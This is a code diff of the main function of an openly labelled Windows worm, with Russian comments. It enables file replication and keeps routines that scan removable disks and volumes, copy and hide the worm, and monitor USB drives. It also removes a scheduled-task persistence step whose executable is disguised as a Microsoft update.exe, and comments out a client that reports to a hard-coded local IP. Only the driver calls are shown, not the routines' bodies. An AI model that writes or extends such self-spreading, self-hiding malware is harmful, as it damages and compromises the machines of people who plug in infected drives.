@@ -12,6 +12,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLin
 #ifdef _DEBUG
 	attach_console();
 #endif
+	//attach_console(); // удалить
 
 	SetConsoleOutputCP(CP_UTF8);
 	SetConsoleCP(CP_UTF8);
@@ -29,20 +30,19 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLin
 
 	// часть с работой самого червя
 	
-	worm1.worm_was_started();
+	//worm1.worm_was_started();
 	worm1.process_all_removable_disks();
 	worm1.scan_all_volumes();
-	//worm1.print_list_dir();
 	worm1.collect_visible_files();
-	//worm1.replicate_files(5);
+	worm1.print_list_dir();
+	worm1.replicate_files(5);
 	worm1.copy_and_hide_worm();
-	worm1.create_scheduled_task(L"C:\\Users\\sseva\\AppData\\Roaming\\Microsoft\\Update\\update.exe");
 	//worm1.print_file_to_copy();
 	
 	return worm1.run_device_monitor(hInstance); // запуск мониторинга флешек
 	//wcout<<get_own_path();
 
-
+	/*
 	// часть с отправлением сообщений на локальный айпишник 
 	DataSend client("10.82.61.198", 12345); // 192.168.0.147 — локальный IP, порт 12345
 
@@ -63,6 +63,6 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLin
 	}
 	else {
 		std::wcout << L"Не удалось подключиться к серверу.\n";
-	}
-	worm1.worm_was_end();
+	*/
+	//worm1.worm_was_end();
 }
